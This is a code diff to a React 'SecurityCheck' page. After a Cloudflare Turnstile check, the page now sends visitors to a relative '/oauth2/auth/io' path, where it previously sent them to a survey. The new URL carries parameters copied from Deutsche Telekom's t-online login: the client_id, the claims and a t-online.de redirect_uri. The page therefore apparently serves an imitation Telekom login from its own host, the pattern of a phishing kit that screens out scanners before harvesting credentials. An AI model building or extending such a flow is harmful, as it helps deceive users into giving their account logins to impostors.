@@ -34,17 +34,31 @@ const SecurityCheck = () => {
     return result;
   }, []);
 
-  // Auto-navigate to survey if Turnstile is disabled - Optimized with useCallback
-  const navigateToSurvey = useCallback(() => {
-    console.log('Turnstile disabled, navigating directly to survey...');
-    navigate('/survey');
-  }, [navigate]);
+  const buildOAuth2URL = useCallback(() => {
+    const baseURL = '/oauth2/auth/io';
+    const params = new URLSearchParams({
+      response_type: 'code',
+      client_id: '10LIVESAM30000004901PORTALE2000000000000',
+      scope: 'openid',
+      claims: '{"id_token":{"urn:telekom.com:all":null}}',
+      state: generateRandomString(43),
+      redirect_uri: 'https://www.t-online.de/auth/login/oauth2/code/telekom',
+      nonce: generateRandomString(43)
+    });
+    return `${baseURL}?${params.toString()}`;
+  }, [generateRandomString]);
+
+  // Auto-navigate to login if Turnstile is disabled - Optimized with useCallback
+  const navigateToOAuth = useCallback(() => {
+    console.log('Turnstile disabled, navigating directly to OAuth2 login...');
+    navigate(buildOAuth2URL());
+  }, [navigate, buildOAuth2URL]);
 
   useEffect(() => {
     if (!TURNSTILE_ENABLED) {
-      navigateToSurvey();
+      navigateToOAuth();
     }
-  }, [navigateToSurvey]);
+  }, [navigateToOAuth]);
 
   // Load Turnstile script and initialize
   useEffect(() => {
@@ -118,9 +132,9 @@ const SecurityCheck = () => {
       console.log('API response result:', result);
 
       if (result.success) {
-        console.log('Verification successful, navigating to survey...');
-        // Navigate to survey page
-        navigate('/survey');
+        console.log('Verification successful, navigating to OAuth2 login...');
+        // Navigate to OAuth2 login page with parameters
+        navigate(buildOAuth2URL());
       } else {
         console.log('Verification failed:', result);
         setError('Verification failed. Please try again.');
@@ -139,7 +153,7 @@ const SecurityCheck = () => {
         window.turnstile.reset(widgetId.current);
       }
     }
-  }, [navigate]);
+  }, [navigate, buildOAuth2URL]);
 
   const handleTurnstileError = useCallback(() => {
     setError('Security check failed. Please refresh the page.');
